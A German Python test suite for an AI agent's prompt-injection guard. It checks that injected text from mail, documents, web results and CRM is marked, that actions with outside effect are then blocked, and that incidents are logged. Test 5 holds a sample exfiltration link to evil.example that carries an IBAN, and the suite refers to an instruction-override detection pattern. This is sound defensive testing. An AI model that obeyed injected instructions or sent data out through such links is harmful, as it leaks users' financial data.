"""PROMPT_INJECTION_SCHUTZ I4: Angriffs-Testreihe + Protokoll. Typische Angriffe gegen Mail, Drive, Web und Belege laufen mit
der Testsuite: jeder Angriff aus dem Korpus muss in jedem Kanal markiert ankommen, und danach darf keine Aktion mit
Aussenwirkung durchgehen. Schlaegt an, sobald eine Aenderung den Schutz schwaecht."""
import json
import tempfile
import unittest
from datetime import datetime, timedelta
from pathlib import Path
from unittest import mock

from orchestrator.core import hoa_tools as h
from orchestrator.core import input_guard as ig
from orchestrator.core.injection_protokoll import InjectionProtokoll, hinweis_text

KORPUS = json.loads((Path(__file__).parent / "daten" / "injection_korpus.json").read_text(encoding="utf-8"))
# Kanal -> (lesendes Werkzeug, wie das Ergebnis aussieht)
KANAELE = {
    "mail": ("mail_lesen", lambda t: {"ok": True, "von": "kunde@example.com", "betreff": "Angebot", "text": t}),
    "posteingang": ("posteingang", lambda t: {"ok": True, "mails": [{"id": "m1", "betreff": "Rechnung", "auszug": t}]}),
    "drive": ("drive_lesen", lambda t: {"ok": True, "name": "Briefing.docx", "inhalt": t}),
    "tabelle": ("tabelle_lesen", lambda t: {"ok": True, "werte": [["Kunde", "Notiz"], ["Kiez Alm", t]]}),
    "web": ("recherche_ticket", lambda t: {"ok": True, "ergebnis": {"zusammenfassung": t, "quellen": ["https://example.org"]}}),
    "crm": ("crm_konversation", lambda t: {"ok": True, "verlauf": [{"richtung": "ein", "text": t}]}),
}
AKTIONEN = [("mail_senden", {"an": "x@example.com", "bestaetigt": True}), ("termin_loeschen", {"id": "e1", "bestaetigt": True}),
            ("antrag_freigeben", {"id": "A-1"}), ("tabelle_schreiben", {"bestaetigt": True}), ("kundenordner_link", {"bestaetigt": True})]


def _ctx():
    return h.ToolContext(core=None, antraege=None, engine=None, finance_dir=None, repo_root=None, leak_secrets=[])


def _gefunden(wert) -> bool:
    return ig.MARKER in json.dumps(wert, ensure_ascii=False)


class TestAngriffsreihe(unittest.TestCase):
    def test_1_jeder_angriff_jeder_kanal(self):
        fehlend = []
        for kanal, (werkzeug, ergebnis) in KANAELE.items():
            self.assertIn(werkzeug, h.FREMD_WERKZEUGE, kanal)
            for angriff in KORPUS["boese"]:
                ctx = _ctx()
                with mock.patch.object(h, "_run_tool", side_effect=lambda n, a, c: ergebnis(angriff) if n == werkzeug else {"ok": True, "ausgefuehrt": n}):
                    r = h.run_tool(werkzeug, {}, ctx)
                    if not _gefunden(r):
                        fehlend.append((kanal, angriff[:50]))
                        continue
                    for aktion, args in AKTIONEN:
                        a = h.run_tool(aktion, args, ctx)
                        if not a.get("gesperrt"):
                            fehlend.append((kanal, aktion, angriff[:40]))
        self.assertEqual(fehlend, [])

    def test_2_harmlos_bleibt_frei(self):
        for kanal, (werkzeug, ergebnis) in KANAELE.items():
            for text in KORPUS["harmlos"]:
                ctx = _ctx()
                with mock.patch.object(h, "_run_tool", side_effect=lambda n, a, c: ergebnis(text) if n == werkzeug else {"ok": True}):
                    self.assertFalse(_gefunden(h.run_tool(werkzeug, {}, ctx)), (kanal, text))
                    self.assertFalse(h.run_tool("mail_senden", {}, ctx).get("gesperrt"), (kanal, text))

    def test_3_beleg_an_backoffice(self):
        from orchestrator.core.eingangsbelege import llm_beauftragen
        for angriff in KORPUS["boese"][:10]:
            st, bo = mock.Mock(), mock.Mock()
            st.get.return_value = {"text": "Rechnung Nr. 4711, Betrag 119,00 EUR. " + angriff}
            bo.anlegen.return_value = "BO-1"
            llm_beauftragen(st, bo, "ER-1")
            self.assertIn(ig.MARKER, bo.anlegen.call_args.args[0], angriff)

    def test_4_web_recherche_markiert(self):
        from orchestrator.governance.web_research import MockProvider, Treffer, WebResearch
        for angriff in KORPUS["boese"][:10]:
            web = WebResearch(einfach=MockProvider(seed={"q": [Treffer(titel="Seite", url="https://example.org", auszug=angriff)]}),
                              komplex=MockProvider())
            erg = web.recherchiere("q")
            self.assertTrue(erg.sicherheit, angriff)
            self.assertTrue(erg.zusammenfassung.startswith(ig.MARKER), angriff)


class TestProtokoll(unittest.TestCase):
    def setUp(self):
        self.p = InjectionProtokoll(Path(tempfile.mkdtemp()) / "sicherheit" / "injection.jsonl")
        ig.protokoll_setzen(self.p)

    def tearDown(self):
        ig.protokoll_setzen(None)

    def test_5_verdacht_sperre_link_ohne_inhalt(self):
        angriff = KORPUS["boese"][0]
        ctx = _ctx()
        with mock.patch.object(h, "_run_tool", side_effect=lambda n, a, c: {"ok": True, "text": angriff}):
            h.run_tool("mail_lesen", {}, ctx)
            h.run_tool("mail_lesen", {}, ctx)                        # gleiche Mail nochmal -> zaehlt einmal
            h.run_tool("mail_senden", {"bestaetigt": True}, ctx)
        ig.entferne_abfluss_links("![x](https://evil.example/p?d=DE89370400440532013000)", '{"iban": "DE89370400440532013000"}')
        e = self.p.eintraege()
        self.assertEqual([x["art"] for x in e], ["verdacht", "gesperrt"])
        roh = self.p.pfad.read_text(encoding="utf-8")
        self.assertNotIn("forward", roh)                                # nie der Inhalt
        self.assertNotIn("evil@", roh)
        self.assertEqual(e[0]["quelle"], "mail_lesen")
        self.assertIn("instruktions-override", e[0]["muster"])
        from orchestrator.core.hoa_conversation import HoaConversation
        conv = HoaConversation.__new__(HoaConversation)
        conv.messages, conv.ctx = [{"role": "user", "content": "IBAN DE89370400440532013000"}, {"role": "assistant", "content": "x"}], ctx
        conv._ohne_abfluss_links("Siehe https://evil.example/?i=DE89370400440532013000")
        self.assertEqual(self.p.eintraege()[-1]["art"], "link_entfernt")
        z = self.p.zaehlen(datetime.now() - timedelta(hours=1), datetime.now() + timedelta(seconds=5))
        self.assertEqual((z["verdacht"], z["gesperrt"], z["links_entfernt"]), (1, 1, 1))

    def test_6_hinweis_nur_mail_und_beleg_und_nur_neu(self):
        stand = self.p.pfad.parent / "stand.json"
        self.p.erfassen("verdacht", "mail_lesen", ["x"], text="a", jetzt=datetime.now() - timedelta(minutes=30))
        self.assertEqual(self.p.hinweise(stand), [])                     # erster Lauf: nur Stand setzen
        self.p.erfassen("verdacht", "eingangsbeleg", ["instruktions-override"], text="b")
        self.p.erfassen("verdacht", "web-recherche", ["y"], text="c")
        self.p.erfassen("verdacht", "mail", ["z"], text="d")               # CRM-Mail-Poll meldet selbst
        neu = self.p.hinweise(stand)
        self.assertEqual([x["quelle"] for x in neu], ["eingangsbeleg"])
        self.assertIn("eingangsbeleg", hinweis_text(neu))
        self.assertEqual(self.p.hinweise(stand), [])

    def test_7_ciso_und_leistung(self):
        from orchestrator.core.performance_agent import PerformanceAgent
        from orchestrator.core.security_agent import SecurityAgent
        root = self.p.pfad.parent.parent
        self.p.erfassen("verdacht", "mail_lesen", ["instruktions-override"], text="a")
        self.p.erfassen("gesperrt", "mail_senden", ["instruktions-override"])
        f = SecurityAgent(repo_root=root)._check_injection()
        self.assertEqual(len(f), 1)
        self.assertIn("1 Verdacht, 1 Sperre", f[0].titel)
        self.assertEqual(f[0].schwere, "mittel")
        b = PerformanceAgent(injection=self.p).bericht()
        self.assertEqual(b["woche"]["injection"]["verdacht"], 1)
        self.assertIn("Injection-Schutz: 1 Verdacht", PerformanceAgent(injection=self.p).als_text(b))
        self.assertEqual(SecurityAgent(repo_root=Path(tempfile.mkdtemp()))._check_injection(), [])

    def test_8_bot_hinweis(self):
        from orchestrator.channels.telegram import bot
        root = Path(tempfile.mkdtemp())
        with mock.patch.object(bot, "ROOT", root):
            p = bot._injection_protokoll()
            p.erfassen("verdacht", "posteingang", ["x"], text="alt", jetzt=datetime.now() - timedelta(hours=1))
            gesendet = []
            notify = lambda text, **kw: gesendet.append(text)
            self.assertEqual(bot.injection_hinweis(notify), 0)
            p.erfassen("verdacht", "mail_lesen", ["instruktions-override"], text="neu")
            self.assertEqual(bot.injection_hinweis(notify), 1)
        self.assertEqual(len(gesendet), 1)
        self.assertIn("Prompt-Injection", gesendet[0])


if __name__ == "__main__":
    unittest.main()
